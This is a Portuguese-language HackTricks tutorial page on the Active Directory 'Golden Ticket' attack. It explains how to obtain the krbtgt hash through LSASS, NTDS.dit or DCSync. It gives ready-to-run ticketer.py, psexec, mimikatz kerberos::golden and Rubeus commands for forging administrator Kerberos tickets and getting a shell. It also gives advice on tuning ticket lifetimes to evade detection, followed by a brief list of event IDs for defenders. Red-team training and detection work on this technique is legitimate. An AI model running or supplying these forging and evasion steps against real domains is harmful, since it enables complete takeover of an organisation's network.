# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Um ataque **Golden Ticket** consiste na **criação de um Ticket Granting Ticket (TGT) legítimo, impersonando qualquer usuário** através do uso do **hash NTLM da conta krbtgt do Active Directory (AD)**. Esta técnica é particularmente vantajosa porque **permite acesso a qualquer serviço ou máquina** dentro do domínio como o usuário impersonado. É crucial lembrar que as **credenciais da conta krbtgt nunca são atualizadas automaticamente**.

Para **adquirir o hash NTLM** da conta krbtgt, vários métodos podem ser empregados. Ele pode ser extraído do **processo Local Security Authority Subsystem Service (LSASS)** ou do **arquivo NT Directory Services (NTDS.dit)** localizado em qualquer Controlador de Domínio (DC) dentro do domínio. Além disso, **executar um ataque DCsync** é outra estratégia para obter esse hash NTLM, que pode ser realizado usando ferramentas como o **módulo lsadump::dcsync** no Mimikatz ou o **script secretsdump.py** do Impacket. É importante ressaltar que para realizar essas operações, **privilégios de administrador de domínio ou um nível de acesso semelhante são tipicamente necessários**.

Embora o hash NTLM sirva como um método viável para esse propósito, é **fortemente recomendado** **forjar tickets usando as chaves Kerberos do Advanced Encryption Standard (AES) (AES128 e AES256)** por razões de segurança operacional.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Do Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Uma vez** que você tenha o **golden Ticket injetado**, você pode acessar os arquivos compartilhados **(C$)** e executar serviços e WMI, então você poderia usar **psexec** ou **wmiexec** para obter um shell (parece que você não pode obter um shell via winrm).

### Contornando detecções comuns

As maneiras mais frequentes de detectar um golden ticket são por **inspecionar o tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que se destacará como anômalo em solicitações TGS subsequentes feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o deslocamento inicial, a duração e o número máximo de renovações (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, a duração do TGT não é registrada nos eventos 4769, então você não encontrará essa informação nos logs de eventos do Windows. No entanto, o que você pode correlacionar é **ver 4769's sem um 4768 anterior**. **Não é possível solicitar um TGS sem um TGT**, e se não houver registro de um TGT sendo emitido, podemos inferir que ele foi forjado offline.

Para **contornar essa detecção**, verifique os diamond tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigação

* 4624: Logon de Conta
* 4672: Logon de Admin
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outras pequenas truques que os defensores podem fazer é **alertar sobre 4769's para usuários sensíveis** como a conta de administrador de domínio padrão.

## Referências
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
